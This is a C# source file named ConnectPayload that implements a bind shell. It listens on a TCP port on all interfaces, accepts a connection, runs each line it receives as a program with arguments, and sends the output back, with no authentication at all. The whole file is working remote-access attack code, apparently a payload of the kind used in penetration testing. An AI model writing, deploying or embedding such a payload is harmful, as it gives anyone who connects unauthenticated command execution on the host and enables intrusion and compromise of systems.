using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;

namespace ConnectPayload
{
    class Program
    {
        static void Main(string[] args)
        {
            try
            {
                int port;

                try
                {
                    port = int.Parse(args[0]);
                }
                catch
                {
                    throw new Exception(string.Format("Usage: {0} PORT\n",
                        System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName));
                }

                TcpListener listener = new TcpListener(IPAddress.Any, port);

                while (true)
                {
                    try
                    {
                        listener.Start();
                    }
                    catch
                    {
                        return;
                    }

                    using (Socket socket = listener.AcceptSocket())
                    {
                        using (NetworkStream stream = new NetworkStream(socket))
                        {
                            using (StreamReader rdr = new StreamReader(stream))
                            {
                                while (true)
                                {
                                    string cmd = rdr.ReadLine();

                                    if (string.IsNullOrEmpty(cmd))
                                    {
                                        rdr.Close();
                                        stream.Close();
                                        listener.Stop();
                                        break;
                                    }

                                    if (string.IsNullOrWhiteSpace(cmd))
                                        continue;

                                    string[] split = cmd.Trim().Split(' ');
                                    string filename = split.First();
                                    string arg = string.Join(" ", split.Skip(1));

                                    try
                                    {
                                        Process prc = new Process();
                                        prc.StartInfo = new ProcessStartInfo();
                                        prc.StartInfo.FileName = filename;
                                        prc.StartInfo.Arguments = arg;
                                        prc.StartInfo.UseShellExecute = false;
                                        prc.StartInfo.RedirectStandardOutput = true;
                                        prc.Start();
                                        prc.StandardOutput.BaseStream.CopyTo(stream);
                                        prc.WaitForExit();
                                    }
                                    catch
                                    {
                                        string error = string.Format("Error running command {0}\n", cmd);
                                        byte[] errorBytes = Encoding.ASCII.GetBytes(error);
                                        stream.Write(errorBytes, 0, errorBytes.Length);
                                    }
                                }
                            }
                        }
                    }
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
        }
    }
}
